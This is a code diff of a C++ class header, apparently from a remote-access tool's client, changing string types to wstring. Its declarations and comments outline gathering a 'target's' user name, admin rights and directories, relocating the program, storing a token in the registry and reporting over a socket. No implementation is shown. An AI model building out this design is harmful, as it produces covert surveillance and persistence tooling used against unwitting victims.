@@ -19,12 +19,12 @@ Sends the primary information when the client connects.
 
         ////Collects information from the machine:   
         bool setIsAdmin(); //look if admin or not and return false or true.
-        string setNameUser(); // Return name user of target 
-        string setCurrentDirectory(); // return current directory;
-        string setLocationProg(); //set localisation prog after remove according to rights
+        wstring setNameUser(); // Return name user of target 
+        wstring setCurrentDirectory(); // return current directory;
+        wstring setLocationProg(); //set localisation prog after remove according to rights
         void setSock(int sock); //Set socket
         
-        string getTokenOrSetTokenInRegistry();
+        wstring getTokenOrSetTokenInRegistry();
         wstring generateToken(const int token_size); //Generate tokken and set in a_token.
 
         //---------------------------------------------------------------------
@@ -38,19 +38,19 @@ Sends the primary information when the client connects.
         //---------------------------------------------------------------------
         
         bool getIsAdmin();//getter of is_admin
-        string getPathProg();// getter see location of prog.
-        string getNameUser();
-        string getToken();
+        wstring getPathProg();// getter see location of prog.
+        wstring getNameUser();
+        wstring getToken();
         //---------------------------------------------------------------------
-        void moveProg(); 
+     
 
     private:
         bool a_is_admin=false;// check if target is admin or not.
-        string a_name_prog;
-        string a_name_user; //https://stackoverflow.com/questions/11587426/get-current-username-in-c-on-windows
-        string a_current_directory; //Location of programme execute.
-        string a_location_prog; //Location of the program once moved or not moved
-        string a_token;
+       // string a_name_prog;
+        wstring a_name_user; //https://stackoverflow.com/questions/11587426/get-current-username-in-c-on-windows
+        wstring a_current_directory; //Location of programme execute.
+        wstring a_path_prog; //Location of the program once moved or not moved
+        wstring a_token;
     
         int a_sock;
         const int a_size_token = 24;
